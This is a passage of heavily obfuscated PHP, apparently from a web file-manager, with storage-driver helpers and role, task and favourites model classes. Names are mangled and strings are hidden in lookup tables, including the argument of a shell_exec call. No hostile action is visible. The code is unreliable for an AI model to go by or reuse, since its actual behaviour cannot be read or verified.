self::make(Model($Ù§ş×ó°[929])->systemRootPathAdd($Ù§ş×ó°[633])); } else { $¯·Ø„Ã = self::systemPath($Ù§ş×ó°[200]); $ƒ¿èÑÀŒ = self::sourceID($¯·Ø„Ã); $¯·Ø„Ã = self::make(Model($Ù§ş×ó°[929])->mkdir($ƒ¿èÑÀŒ, $ëïÌÏìä)); } Model($Ù§ş×ó°[869])->set($±ºşÜù, $¯·Ø„Ã); return $¯·Ø„Ã; } public static function systemFolder($ê¬€‹¹µ) { $˜æÑ€¸ = IO_PATH_SYSTEM_SOURCE . $ê¬€‹¹µ; $±»Ü‡Çô = Cache::get($˜æÑ€¸); if (!$±»Ü‡Çô) { $ü«ÂÆÈ× = IO::infoFullSimple($˜æÑ€¸); if (!$ü«ÂÆÈ×) { $±»Ü‡Çô = IO::mkdir($˜æÑ€¸, REPEAT_SKIP); } else { $±»Ü‡Çô = $ü«ÂÆÈ×[$_SERVER[ŒÅŸ‹ä†][97]]; } Cache::set($˜æÑ€¸, $±»Ü‡Çô, 3600 * 10); } return $±»Ü‡Çô; } public static function defaultDriver() { return Model($_SERVER[ŒÅŸ‹ä†][864])->defaultDriver(); } public static function defaultDriverInit() { $êßïõÄÌ =& $_SERVER[ŒÅŸ‹ä†]; static $ ‰œ¡“ = false; if ($ ‰œ¡“) { return $ ‰œ¡“; } $¶Ë¸ÚÇ¼ = self::defaultDriver(); $ ‰œ¡“ = IO::init($êßïõÄÌ[1430] . $¶Ë¸ÚÇ¼[$êßïõÄÌ[492]] . $êßïõÄÌ[1418]); return $ ‰œ¡“; } public static function fileTypeList() { $áßóäÄÈ =& $_SERVER[ŒÅŸ‹ä†]; $™ÂŞ·é÷ = $GLOBALS[$áßóäÄÈ[6]][$áßóäÄÈ[1431]]; foreach ($™ÂŞ·é÷ as $òÓ‚¸ª => $ı¹¥´¬¼) { $é‚›Æ–Ò = $áßóäÄÈ[1432] . $òÓ‚¸ª; $€ª×¹ = LNG($é‚›Æ–Ò); if ($é‚›Æ–Ò != $€ª×¹) { $™ÂŞ·é÷[$òÓ‚¸ª][$áßóäÄÈ[42]] = $€ª×¹; } } return $™ÂŞ·é÷; } public static function ioFileDriverGet($³Åãä° = '') { $•´ËÔº© =& $_SERVER[ŒÅŸ‹ä†]; static $›‰è½•Ã = array(); static $¬†‚ª¢È = array(); static $·ÅÙõ÷² = array(); static $µÖ¤è¤ì = false; if ($µÖ¤è¤ì === !1) { $µÖ¤è¤ì = array($•´ËÔº©[603] => array(), $•´ËÔº©[690] => array()); $é×šØŒè = Model($•´ËÔº©[1433])->get(!1, $•´ËÔº©[1434]); foreach ($é×šØŒè as $€—ìùçÚ => $˜õ¬‚) { if (!$˜õ¬‚ || $˜õ¬‚ == $•´ËÔº©[12]) { continue; } if (strstr($€—ìùçÚ, $•´ËÔº©[1435])) { $“¹À—ş— = str_replace($•´ËÔº©[1435], $•´ËÔº©[12], $€—ìùçÚ); $µÖ¤è¤ì[$•´ËÔº©[603]][$“¹À—ş—] = $˜õ¬‚; } else { if (strstr($€—ìùçÚ, $•´ËÔº©[1436])) { $“¹À—ş— = str_replace($•´ËÔº©[1436], $•´ËÔº©[12], $€—ìùçÚ); $µÖ¤è¤ì[$•´ËÔº©[690]][$“¹À—ş—] = $˜õ¬‚; } } } } $Èô®§„Î = self::defaultDriver(); if (!$³Åãä° || !$µÖ¤è¤ì[$•´ËÔº©[603]] && !$µÖ¤è¤ì[$•´ËÔº©[690]]) { return $Èô®§„Î; } $ôê­á·Ì = self::getPathSourceID($³Åãä°); if (!$ôê­á·Ì) { return $Èô®§„Î; } if (isset($›‰è½•Ã[$ôê­á·Ì])) { return $›‰è½•Ã[$ôê­á·Ì]; } $¡ŸÀ”–· = Model($•´ËÔº©[929])->sourceInfo($ôê­á·Ì); $ÇŒ¡ĞÃù = $¡ŸÀ”–·[$•´ËÔº©[594]]; $–ò³Á—” = array(); if (!$¡ŸÀ”–·) { return $Èô®§„Î; } if ($¡ŸÀ”–·[$•´ËÔº©[199]] == $•´ËÔº©[101]) { if (isset($·ÅÙõ÷²[$ÇŒ¡ĞÃù])) { return $·ÅÙõ÷²[$ÇŒ¡ĞÃù]; } if (isset($µÖ¤è¤ì[$•´ËÔº©[690]][$ÇŒ¡ĞÃù])) { $Šô‰ÂÁı = Model($•´ËÔº©[864])->driverInfo($µÖ¤è¤ì[$•´ËÔº©[690]][$ÇŒ¡ĞÃù]); $Èô®§„Î = $Šô‰ÂÁı ? $Šô‰ÂÁı : $Èô®§„Î; $·ÅÙõ÷²[$ÇŒ¡ĞÃù] = $Èô®§„Î; $›‰è½•Ã[$ôê­á·Ì] = $Èô®§„Î; return $Èô®§„Î; } $–ò³Á—” = self::groupParentUser($ÇŒ¡ĞÃù); } else { if ($¡ŸÀ”–·[$•´ËÔº©[199]] == $•´ËÔº©[529]) { $ÕºØÂªô = Model($•´ËÔº©[1437])->getInfo($ÇŒ¡ĞÃù); if ($ÕºØÂªô) { $–ò³Á—” = explode($•´ËÔº©[60], trim($ÕºØÂªô[$•´ËÔº©[609]], $•´ËÔº©[60])); $–ò³Á—” = array_remove_value($–ò³Á—”, $•´ËÔº©[239]); $–ò³Á—”[] = $ÇŒ¡ĞÃù; $–ò³Á—” = array_reverse($–ò³Á—”); } } } foreach ($–ò³Á—” as $ôØ¾à­û) { if (!isset($µÖ¤è¤ì[$•´ËÔº©[603]][$ôØ¾à­û])) { continue; } if (isset($¬†‚ª¢È[$ôØ¾à­û])) { return $¬†‚ª¢È[$ôØ¾à­û]; } $Šô‰ÂÁı = Model($•´ËÔº©[864])->driverInfo($µÖ¤è¤ì[$•´ËÔº©[603]][$ôØ¾à­û]); $Èô®§„Î = $Šô‰ÂÁı ? $Šô‰ÂÁı : $Èô®§„Î; $¬†‚ª¢È[$ôØ¾à­û] = $Èô®§„Î; break; } if ($¡ŸÀ”–·[$•´ËÔº©[199]] == $•´ËÔº©[101]) { $·ÅÙõ÷²[$ÇŒ¡ĞÃù] = $Èô®§„Î; } $›‰è½•Ã[$ôê­á·Ì] = $Èô®§„Î; return $Èô®§„Î; } private static function getPathSourceID($Â®áÀÔ©) { $°ìõ­×¢ =& $_SERVER[ŒÅŸ‹ä†]; static $¬µ°†õí = array(); if (!$Â®áÀÔ©) { return $°ìõ­×¢[12]; } $¯ÊË’¼ = substr($Â®áÀÔ©, 0, strlen($°ìõ­×¢[503])) == $°ìõ­×¢[503]; $ï²×Ë¢Œ = substr($Â®áÀÔ©, 0, strlen($°ìõ­×¢[1404])) == $°ìõ­×¢[1404]; $ÙÈâÈÊ = substr($Â®áÀÔ©, 0, strlen($°ìõ­×¢[1405])) == $°ìõ­×¢[1405]; if (!$¯ÊË’¼ && !$ï²×Ë¢Œ && !$ÙÈâÈÊ) { return $°ìõ­×¢[12]; } $îÌ¾öæÚ = self::parse($Â®áÀÔ©); $ëıïöµï = $îÌ¾öæÚ[$°ìõ­×¢[1298]]; if ($¯ÊË’¼) { return $îÌ¾öæÚ[$°ìõ­×¢[492]]; } if (isset($¬µ°†õí[$ëıïöµï])) { $Ó²€ûãÇ = $¬µ°†õí[$ëıïöµï]; } else { $Ó²€ûãÇ = IO::init($ëıïöµï); $¬µ°†õí[$ëıïöµï] = $Ó²€ûãÇ; } if (isset($Ó²€ûãÇ->pathParse[$°ìõ­×¢[1301]])) { return $Ó²€ûãÇ->pathParse[$°ìõ­×¢[1301]]; } return $°ìõ­×¢[12]; } private static function groupParentUser($˜ØÅùÏ©) { $‡şëÕçÕ =& $_SERVER[ŒÅŸ‹ä†]; $†ğáÈ‡ = Model($‡şëÕçÕ[622])->getInfo($˜ØÅùÏ©); if (!$†ğáÈ‡) { return array(); } $Ÿ™çÖĞ— = array_to_keyvalue($†ğáÈ‡[$‡şëÕçÕ[1438]], $‡şëÕçÕ[12], $‡şëÕçÕ[1439]); $â„Ìë¯Ã = array(); foreach ($†ğáÈ‡[$‡şëÕçÕ[1438]] as $æ¿üŸüÊ) { $â„Ìë¯Ã[] = $æ¿üŸüÊ[$‡şëÕçÕ[1439]]; $šıó‘ = explode($‡şëÕçÕ[60], trim($æ¿üŸüÊ[$‡şëÕçÕ[609]], $‡şëÕçÕ[60])); $šıó‘ = array_remove_value($šıó‘, $‡şëÕçÕ[239]); $šıó‘ = array_reverse($šıó‘); $â„Ìë¯Ã = array_merge($â„Ìë¯Ã, $šıó‘); } return array_unique($â„Ìë¯Ã); } public static function diskList($Æ¥á¬Â = true) { $¼•‹›Õ¸ = $_SERVER[ŒÅŸ‹ä†][1440]; if ($Æ¥á¬Â) { $ı—¬ÙËé = Cache::get($¼•‹›Õ¸); if (is_array($ı—¬ÙËé)) { return $ı—¬ÙËé; } } $ı—¬ÙËé = self::diskListGet(); Cache::set($¼•‹›Õ¸, $ı—¬ÙËé, 60); return $ı—¬ÙËé; } public static function diskListGet() { $¸ŒÓÒË¬ =& $_SERVER[ŒÅŸ‹ä†]; $»ãé™ÓÄ = array(); if ($GLOBALS[$¸ŒÓÒË¬[6]][$¸ŒÓÒË¬[1441]] == $¸ŒÓÒË¬[1442]) { $©ç¸¶º‘ = $¸ŒÓÒË¬[1443]; for ($åæƒŠ¦Ç = 0; $åæƒŠ¦Ç < strlen($©ç¸¶º‘); $åæƒŠ¦Ç++) { $åâ—ÉŞÄ = $©ç¸¶º‘[$åæƒŠ¦Ç] . $¸ŒÓÒË¬[1444]; if (file_exists($åâ—ÉŞÄ)) { $»ãé™ÓÄ[] = $åâ—ÉŞÄ; } } return $»ãé™ÓÄ; } if (!function_exists($¸ŒÓÒË¬[109])) { $»ãé™ÓÄ[] = $¸ŒÓÒË¬[943]; return $»ãé™ÓÄ; } $ßöÙĞ¯  = explode($¸ŒÓÒË¬[18], shell_exec($¸ŒÓÒË¬[1445])); array_shift($ßöÙĞ¯ ); array_pop($ßöÙĞ¯ ); $®ÑãÑ« = array($¸ŒÓÒË¬[1446], $¸ŒÓÒË¬[1447], $¸ŒÓÒË¬[1448], $¸ŒÓÒË¬[1449], $¸ŒÓÒË¬[1450], $¸ŒÓÒË¬[1451], $¸ŒÓÒË¬[1452], $¸ŒÓÒË¬[1453]); foreach ($ßöÙĞ¯  as $Ÿ£ø¢ˆ¸) { $ğş­­°â = preg_split($¸ŒÓÒË¬[1454], $Ÿ£ø¢ˆ¸); $åâ—ÉŞÄ = $ğş­­°â[count($ğş­­°â) - 1]; if (!strstr($ğş­­°â[0], $¸ŒÓÒË¬[1455]) || !$åâ—ÉŞÄ) { continue; } $÷š®›×å = rtrim($åâ—ÉŞÄ, $¸ŒÓÒË¬[8]) . $¸ŒÓÒË¬[8]; if (in_array($÷š®›×å, $®ÑãÑ«)) { continue; } $»ãé™ÓÄ[] = $÷š®›×å; } return $»ãé™ÓÄ; } public static function isSameDisk($ø şü, $èª¥¹ò„) { $ó–Ä·ïé =& $_SERVER[ŒÅŸ‹ä†]; if ($GLOBALS[$ó–Ä·ïé[6]][$ó–Ä·ïé[1441]] == $ó–Ä·ïé[1442]) { return strtolower(substr($ø şü, 0, 1)) == strtolower(substr($èª¥¹ò„, 0, 1)); } $ÊÈŒÂ‡× = stat($ø şü); $ª•¦Šùî = stat($èª¥¹ò„); if ($ÊÈŒÂ‡× === !1 || $ª•¦Šùî === !1) { return !1; } return $ÊÈŒÂ‡×[$ó–Ä·ïé[1456]] === $ª•¦Šùî[$ó–Ä·ïé[1456]]; $ëòáèÓĞ = self::diskList(); $ãª˜Âå = !1; $ìÛÁ¯™Â = !1; sort($ëòáèÓĞ); $ëòáèÓĞ = array_reverse($ëòáèÓĞ); $ø şü = rtrim($ø şü, $ó–Ä·ïé[8]) . $ó–Ä·ïé[8]; $èª¥¹ò„ = rtrim($èª¥¹ò„, $ó–Ä·ïé[8]) . $ó–Ä·ïé[8]; foreach ($ëòáèÓĞ as $ÕÆôÌô•) { $åÖ¸…İ = strlen($ÕÆôÌô•); if (!$ãª˜Âå && substr($ø şü, 0, $åÖ¸…İ) == $ÕÆôÌô•) { $ãª˜Âå = $ÕÆôÌô•; } if (!$ìÛÁ¯™Â && substr($èª¥¹ò„, 0, $åÖ¸…İ) == $ÕÆôÌô•) { $ìÛÁ¯™Â = $ÕÆôÌô•; } if ($ãª˜Âå && $ìÛÁ¯™Â) { break; } } return $ãª˜Âå === $ìÛÁ¯™Â; } public static function transferType($ì£”åœÜ, $şÕÎ‘ë„) { $»§Ñşö =& $_SERVER[ŒÅŸ‹ä†]; $ªâÕµé„ = self::driverType($ì£”åœÜ); $ÂğŒ¦ßı = self::driverType($şÕÎ‘ë„); if ($ªâÕµé„[$»§Ñşö[43]] == $ÂğŒ¦ßı[$»§Ñşö[43]] && $ªâÕµé„[$»§Ñşö[1457]] == $ÂğŒ¦ßı[$»§Ñşö[1457]]) { return $»§Ñşö[1458]; } if ($ªâÕµé„[$»§Ñşö[43]] == $»§Ñşö[977] && $ÂğŒ¦ßı[$»§Ñşö[43]] == $»§Ñşö[117]) { return $»§Ñşö[1326]; } if ($ªâÕµé„[$»§Ñşö[43]] == $»§Ñşö[117] && $ÂğŒ¦ßı[$»§Ñşö[43]] == $»§Ñşö[977]) { return $»§Ñşö[118]; } return $»§Ñşö[1459]; } public static function driverType($íúÎ’‰Å) { $™¤÷‘ø¾ =& $_SERVER[ŒÅŸ‹ä†]; $Å¡õ÷‹ = str_replace($™¤÷‘ø¾[1460], $™¤÷‘ø¾[12], strtolower($íúÎ’‰Å->getType())); if ($Å¡õ÷‹ == $™¤÷‘ø¾[854] || $Å¡õ÷‹ == $™¤÷‘ø¾[1461] || $Å¡õ÷‹ == $™¤÷‘ø¾[1462]) { $¤ëÒ¨Ğ = self::ioFileDriverGet($™¤÷‘ø¾[503] . $íúÎ’‰Å->pathParse[$™¤÷‘ø¾[1301]] . $™¤÷‘ø¾[412]); $íúÎ’‰Å = IO::init($™¤÷‘ø¾[1430] . $¤ëÒ¨Ğ[$™¤÷‘ø¾[492]] . $™¤÷‘ø¾[1418]); } else { if ($Å¡õ÷‹ == $™¤÷‘ø¾[1336] || $Å¡õ÷‹ == $™¤÷‘ø¾[1463]) { $íúÎ’‰Å = IO::init($íúÎ’‰Å->pathParse[$™¤÷‘ø¾[1278]]); } } $ìãä”° = $íúÎ’‰Å->path; $Å¡õ÷‹ = str_replace($™¤÷‘ø¾[1460], $™¤÷‘ø¾[12], strtolower($íúÎ’‰Å->getType())); if ($Å¡õ÷‹ == $™¤÷‘ø¾[117]) { return array($™¤÷‘ø¾[43] => $™¤÷‘ø¾[117], $™¤÷‘ø¾[1457] => $™¤÷‘ø¾[12], $™¤÷‘ø¾[97] => $ìãä”°, $™¤÷‘ø¾[106] => $íúÎ’‰Å); } return array($™¤÷‘ø¾[43] => $™¤÷‘ø¾[977], $™¤÷‘ø¾[1457] => $íúÎ’‰Å->pathDriver, $™¤÷‘ø¾[97] => $ìãä”°, $™¤÷‘ø¾[106] => $íúÎ’‰Å); } public static function pathDriverType($ÓÇ¶Îôı) { return $ÓÇ¶Îôı ? self::driverType(IO::init($ÓÇ¶Îôı)) : !1; } public static function pathDriverLocal($‹åœ¿Àë) { $ˆÃâçë‚ =& $_SERVER[ŒÅŸ‹ä†]; $Ëş¡âı– = $‹åœ¿Àë ? self::driverType(IO::init($‹åœ¿Àë)) : !1; return strtolower($Ëş¡âı–[$ˆÃâçë‚[43]]) == $ˆÃâçë‚[117] ? !0 : !1; } public static function allowCover($ªÃ†ĞŞÄ, $À––¡¾Ò = true) { $¡ıÆôÍÊ =& $_SERVER[ŒÅŸ‹ä†]; if (is_string($ªÃ†ĞŞÄ)) { $ªÃ†ĞŞÄ = IO::info($ªÃ†ĞŞÄ); } if (!$ªÃ†ĞŞÄ || $ªÃ†ĞŞÄ[$¡ıÆôÍÊ[43]] == $¡ıÆôÍÊ[88] || $ªÃ†ĞŞÄ[$¡ıÆôÍÊ[89]] <= 100) { return !1; } if (isset($ªÃ†ĞŞÄ[$¡ıÆôÍÊ[1464]]) || !$ªÃ†ĞŞÄ[$¡ıÆôÍÊ[97]]) { return !1; } if (isset($ªÃ†ĞŞÄ[$¡ıÆôÍÊ[243]]) && !$ªÃ†ĞŞÄ[$¡ıÆôÍÊ[243]]) { return !1; } static $ßêÊ¤¹ = false; if (!$ßêÊ¤¹ || !$À––¡¾Ò) { $ÑÇö±¼¶ = self::driverType(IO::init($ªÃ†ĞŞÄ[$¡ıÆôÍÊ[97]])); $âÊ¡ÆÏ‹ = $ÑÇö±¼¶[$¡ıÆôÍÊ[106]]; $ßêÊ¤¹ = $¡ıÆôÍÊ[205]; if ($ÑÇö±¼¶[$¡ıÆôÍÊ[43]] == $¡ıÆôÍÊ[117]) { $ßêÊ¤¹ = $¡ıÆôÍÊ[1465]; } if ($ÑÇö±¼¶[$¡ıÆôÍÊ[106]] && is_array($ÑÇö±¼¶[$¡ıÆôÍÊ[106]]->config)) { $”“€Ğù¡ = $ÑÇö±¼¶[$¡ıÆôÍÊ[106]]->config; if (isset($”“€Ğù¡[$¡ıÆôÍÊ[1466]]) && $”“€Ğù¡[$¡ıÆôÍÊ[1466]]) { $ßêÊ¤¹ = $¡ıÆôÍÊ[1465]; } } $ò×ºõ¸‰ = KodIO::defaultDriver(); if (strtolower($ò×ºõ¸‰[$¡ıÆôÍÊ[106]]) == $¡ıÆôÍÊ[117] && is_array($ò×ºõ¸‰[$¡ıÆôÍÊ[6]])) { $ÁüñàÛ¡ = $ò×ºõ¸‰[$¡ıÆôÍÊ[6]][$¡ıÆôÍÊ[1310]]; if (substr($ÁüñàÛ¡, 0, 2) == $¡ıÆôÍÊ[1467]) { $ÁüñàÛ¡ = str_replace($¡ıÆôÍÊ[1467], BASIC_PATH, $ÁüñàÛ¡); } $ÁüñàÛ¡ = str_replace($¡ıÆôÍÊ[265], $¡ıÆôÍÊ[8], $ÁüñàÛ¡); if (substr($ªÃ†ĞŞÄ[$¡ıÆôÍÊ[97]], 0, strlen($ÁüñàÛ¡)) == $ÁüñàÛ¡) { $ßêÊ¤¹ = $¡ıÆôÍÊ[205]; } } } return $ßêÊ¤¹ == $¡ıÆôÍÊ[1465] ? !0 : !1; } } goto a’†ñ¼¤ğğ; E¥Ï¬øÃŠò: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\162\x6f\154\x65\x4c\151\163\x74"; public $field = array("\156\141\155\145", "\141\165\x74\x68", "\154\141\142\145\154", "\x64\x69\x73\160\154\x61\171", "\x73\x79\163\164\x65\x6d", "\x64\145\x73\143", "\x69\x67\x6e\157\x72\x65\105\170\x74", "\x69\x67\156\157\162\145\106\151\x6c\145\x53\x69\x7a\x65", "\x61\144\x6d\x69\x6e\151\x73\x74\162\141\164\x6f\x72", "\163\157\x72\164"); public function listData($áÎÚÙÏĞ = false, $‚õù¬ÌÆ = "\163\157\162\164", $ÌÓÉÌ«† = false) { $‡®ÅØêæ =& $_SERVER[ŒÅŸ‹ä†]; $€½º¥£Ÿ = parent::listData($áÎÚÙÏĞ, $‚õù¬ÌÆ, $ÌÓÉÌ«†); if (!$áÎÚÙÏĞ) { foreach ($€½º¥£Ÿ as $”êú¾† => $æ’Ó×ä) { if ($æ’Ó×ä[$‡®ÅØêæ[2319]] == 1) { $€½º¥£Ÿ[$”êú¾†][$‡®ÅØêæ[545]] = LNG($‡®ÅØêæ[2610]); } } } return $€½º¥£Ÿ; } public function update($àª®œ¤, $éİ„ƒË) { $¸Šú£§ =& $_SERVER[ŒÅŸ‹ä†]; $ë àÁñØ = parent::listData($àª®œ¤); $Ğ¯ÖĞ¨ƒ = $this->findByName($éİ„ƒË[$¸Šú£§[42]]); if (!$ë àÁñØ || $Ğ¯ÖĞ¨ƒ && $Ğ¯ÖĞ¨ƒ[$¸Šú£§[492]] != $ë àÁñØ[$¸Šú£§[492]]) { return !1; } if ($Ğ¯ÖĞ¨ƒ[$¸Šú£§[2319]] == 1) { $éİ„ƒË = array($¸Šú£§[42] => $éİ„ƒË[$¸Šú£§[42]], $¸Šú£§[2147] => $éİ„ƒË[$¸Šú£§[2147]]); } $this->filterAuth($éİ„ƒË[$¸Šú£§[507]]); return parent::update($àª®œ¤, $éİ„ƒË); } public function remove($ õœŒÊ¼) { $¬üÖ‡¼ = parent::listData($ õœŒÊ¼); if (!$¬üÖ‡¼ || $¬üÖ‡¼[$_SERVER[ŒÅŸ‹ä†][200]]) { return !1; } return parent::remove($ õœŒÊ¼); } public function add($¡š‡“ ) { $ã­€ˆ½ï =& $_SERVER[ŒÅŸ‹ä†]; $°Ü§‡ºÃ = $¡š‡“ [$ã­€ˆ½ï[42]]; if ($this->findByName($°Ü§‡ºÃ)) { return !1; } $€Ì¸‡Ö„ = array($ã­€ˆ½ï[514] => $°Ü§‡ºÃ, $ã­€ˆ½ï[2132] => $ã­€ˆ½ï[12], $ã­€ˆ½ï[2128] => $ã­€ˆ½ï[2136], $ã­€ˆ½ï[2611] => 1, $ã­€ˆ½ï[2131] => 0, $ã­€ˆ½ï[2612] => 0, $ã­€ˆ½ï[2130] => $this->getSort()); $¡š‡“  = array_merge($€Ì¸‡Ö„, $¡š‡“ ); $this->filterAuth($¡š‡“ [$ã­€ˆ½ï[507]]); return parent::insert($¡š‡“ ); } private function getSort() { $öÌ·ô© =& $_SERVER[ŒÅŸ‹ä†]; $°ÚÍÃ˜î = parent::listData(); $Î¬·Œà = array_to_keyvalue($°ÚÍÃ˜î, $öÌ·ô©[12], $öÌ·ô©[2148]); return empty($Î¬·Œà) ? 0 : max($Î¬·Œà) + 1; } private function filterAuth(&$ùŞ¥Úû¶) { $¯ÉÂûåŠ =& $_SERVER[ŒÅŸ‹ä†]; $ÑÑáÀ®ş = array(); $ß¨ŞîãÁ = array_filter(explode($¯ÉÂûåŠ[60], $ùŞ¥Úû¶)); foreach ($ß¨ŞîãÁ as $ùŞ¥Úû¶) { $”¯©äø„ = explode($¯ÉÂûåŠ[10], $ùŞ¥Úû¶); if ($”¯©äø„[0] == $¯ÉÂûåŠ[2613] && $”¯©äø„[1] != $¯ÉÂûåŠ[1250]) { $Üù³ÄÉ¿ = $”¯©äø„[0] . $¯ÉÂûåŠ[10] . $”¯©äø„[1] . $¯ÉÂûåŠ[2614]; if (!in_array($Üù³ÄÉ¿, $ß¨ŞîãÁ)) { $ÑÑáÀ®ş[] = $Üù³ÄÉ¿; } } $ÑÑáÀ®ş[] = $ùŞ¥Úû¶; } $ùŞ¥Úû¶ = implode($¯ÉÂûåŠ[60], $ÑÑáÀ®ş); } public function findRoleDefault() { $ê™·‚«Ï =& $_SERVER[ŒÅŸ‹ä†]; $Ş†æ¼âç = parent::listData(); $„­à™Õã = !1; foreach ($Ş†æ¼âç as $à€üÔÏÓ) { if (!$à€üÔÏÓ || $à€üÔÏÓ[$ê™·‚«Ï[2146]] == $ê™·‚«Ï[239] || $à€üÔÏÓ[$ê™·‚«Ï[2319]] == 1) { continue; } if (strstr($à€üÔÏÓ[$ê™·‚«Ï[507]], $ê™·‚«Ï[2615])) { continue; } if (!strstr($à€üÔÏÓ[$ê™·‚«Ï[507]], $ê™·‚«Ï[2616])) { continue; } if (!$„­à™Õã) { $„­à™Õã = $à€üÔÏÓ; continue; } $Äš¾ÔŠ¬ = explode($ê™·‚«Ï[60], $„­à™Õã[$ê™·‚«Ï[507]]); $¤¨Ó²§Œ = explode($ê™·‚«Ï[60], $à€üÔÏÓ[$ê™·‚«Ï[507]]); if (count($Äš¾ÔŠ¬) > count($¤¨Ó²§Œ)) { $„­à™Õã = $à€üÔÏÓ; } } return $„­à™Õã ? $„­à™Õã[$ê™·‚«Ï[492]] : $ê™·‚«Ï[12]; } public function sort($°½§†Óˆ, $ì¼¾´™§) { return parent::update($°½§†Óˆ, $ì¼¾´™§); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\x74\141\163\x6b\x4c\151\x73\164"; public $field = array("\x6e\141\155\145", "\x74\x79\x70\145", "\x65\166\145\156\164", "\164\x69\155\145", "\144\145\163\143", "\163\x79\163\164\x65\155", "\x65\156\141\142\154\x65", "\154\x61\x73\x74\x52\x75\x6e", "\163\x6f\162\164"); public function listData($«±Ç“ı¨ = false, $ŞØéçİè = "\x73\157\162\164", $†€¸…³€ = false) { return parent::listData($«±Ç“ı¨, $ŞØéçİè, $†€¸…³€); } public function add($¿ö´Şı) { $ºøı• =& $_SERVER[ŒÅŸ‹ä†]; $Øã”†ºŒ = $this->findByName($¿ö´Şı[$ºøı•[42]]); if ($Øã”†ºŒ) { return !1; } $¿ö´Şı[$ºøı•[1871]] = 0; $¿ö´Şı[$ºøı•[2148]] = $this->getSort(); return parent::insert($¿ö´Şı); } private function getSort() { $‹òİ–æ¡ =& $_SERVER[ŒÅŸ‹ä†]; $’âş£â“ = parent::listData(); $İ¸Şœ» = array_to_keyvalue($’âş£â“, $‹òİ–æ¡[12], $‹òİ–æ¡[2148]); return empty($İ¸Şœ») ? 0 : max($İ¸Şœ») + 1; } public function update($æú¨äŒ, $ıÂ¨üÄ») { $ç”•û® =& $_SERVER[ŒÅŸ‹ä†]; $Ä¨òÄ¹Ú = $this->listData($æú¨äŒ); $±…ı‹ = $this->findByName($ıÂ¨üÄ»[$ç”•û®[42]]); if (!$Ä¨òÄ¹Ú || $±…ı‹ && $±…ı‹[$ç”•û®[492]] != $Ä¨òÄ¹Ú[$ç”•û®[492]]) { return !1; } return parent::update($æú¨äŒ, $ıÂ¨üÄ»); } public function remove($ùÁ‰÷æé, $Ò»»Ìş° = false) { $¦¼Ú¾ñĞ =& $_SERVER[ŒÅŸ‹ä†]; $ñ§„°²è = $this->listData($ùÁ‰÷æé); if (!$ñ§„°²è) { return; } if (!$Ò»»Ìş° && $ñ§„°²è[$¦¼Ú¾ñĞ[200]] == $¦¼Ú¾ñĞ[101]) { return !1; } return parent::remove($ùÁ‰÷æé); } public function enable($¼£ºæ†, $†¨Ø©ø) { return $this->update($¼£ºæ†, array($_SERVER[ŒÅŸ‹ä†][2605] => $†¨Ø©ø)); } public function run($ŞÕ“§®›) { return $this->update($ŞÕ“§®›, array($_SERVER[ŒÅŸ‹ä†][2617] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($¡Š²¸Ù‰) { $è«Ş¬êï =& $_SERVER[ŒÅŸ‹ä†]; return array($è«Ş¬êï[2238] => array(USER_ID, $è«Ş¬êï[2618])); } protected function ___listData() { $ëøÈ˜ñ¶ =& $_SERVER[ŒÅŸ‹ä†]; $©ÑùÁœ = array($ëøÈ˜ñ¶[1911] => USER_ID, $ëøÈ˜ñ¶[578] => 0); $½ªŒÂÍ = $ëøÈ˜ñ¶[2619]; $ã¿¿üİ = $this->field($½ªŒÂÍ)->where($©ÑùÁœ)->order($ëøÈ˜ñ¶[2620])->select(); return $ã¿¿üİ ? $ã¿¿üİ : array(); } protected function resetCache() { } protected function listView() { $ŸÃ·È¨´ =& $_SERVER[ŒÅŸ‹ä†]; $ˆ°Ÿº« = $this->listData(); $¥×›õ£– = array_filter_by_field($ˆ°Ÿº«, $ŸÃ·È¨´[43], $ŸÃ·È¨´[510]); $ì¢×±•Í = array_to_keyvalue($¥×›õ£–, $ŸÃ·È¨´[12], $ŸÃ·È¨´[97]); if (!$ì¢×±•Í) { return $ˆ°Ÿº«; } $îÚ®ËÒé = 2000; $ƒ¡Àüò® = array($ŸÃ·È¨´[511] => array($ŸÃ·È¨´[512], $ì¢×±•Í)); $¤¬ÔàÑ = Model($ŸÃ·È¨´[929])->listSource($ƒ¡Àüò®, $îÚ®ËÒé); $¤¬ÔàÑ = array_merge($¤¬ÔàÑ[$ŸÃ·È¨´[96]], $¤¬ÔàÑ[$ŸÃ·È¨´[95]]); $¤¬ÔàÑ = array_to_keyvalue($¤¬ÔàÑ, $ŸÃ·È¨´[202]); foreach ($ˆ°Ÿº« as $¸˜ø©—® => $ã· –¨¸) { $¸¬ß‹˜ = $¤¬ÔàÑ[$ã· –¨¸[$ŸÃ·È¨´[97]]]; $¸¬ß‹˜ = $¸¬ß‹˜ ? $¸¬ß‹˜ : array(); $ˆ°Ÿº«[$¸˜ø©—®] = array_merge($¸¬ß‹˜, $ã· –¨¸); } return $ˆ°Ÿº«; } protected function addFav($¹¤âÙàœ, $Œî§ñÔ = '', $èÂÁÄöæ = "\163\x6f\165\162\143\x65") { $ëáçÅ£Ú =& $_SERVER[ŒÅŸ‹ä†]; $¸İááğ‚ = array($ëáçÅ£Ú[1911] => USER_ID, $ëáçÅ£Ú[578] => 0, $ëáçÅ£Ú[516] => $èÂÁÄöæ, $ëáçÅ£Ú[515] => $¹¤âÙàœ); if ($this->where($¸İááğ‚)->find()) { return !1; } $¸İááğ‚ = array($ëáçÅ£Ú[1911] => USER_ID, $ëáçÅ£Ú[578] => 0); $®¶úåšÒ = $this->where($¸İááğ‚)->max($ëáçÅ£Ú[2148]); if (!$®¶úåšÒ) { $®¶úåšÒ = 0; } if (!$Œî§ñÔ && $èÂÁÄöæ == $ëáçÅ£Ú[510]) { $ıºùè¦ñ = Model($ëáçÅ£Ú[1477])->where(array($ëáçÅ£Ú[511] => $¹¤âÙàœ))->find(); if (!$ıºùè¦ñ) { return !1; } $Œî§ñÔ = $ıºùè¦ñ[$ëáçÅ£Ú[42]]; } $Œî§ñÔ = $this->getAutoName($Œî§ñÔ); $µ¬À®öá = array($ëáçÅ£Ú[1911] => USER_ID, $ëáçÅ£Ú[578] => 0, $ëáçÅ£Ú[514] => $Œî§ñÔ, $ëáçÅ£Ú[515] => $¹¤âÙàœ, $ëáçÅ£Ú[516] => $èÂÁÄöæ, $ëáçÅ£Ú[2130] => $®¶úåšÒ + 1); return 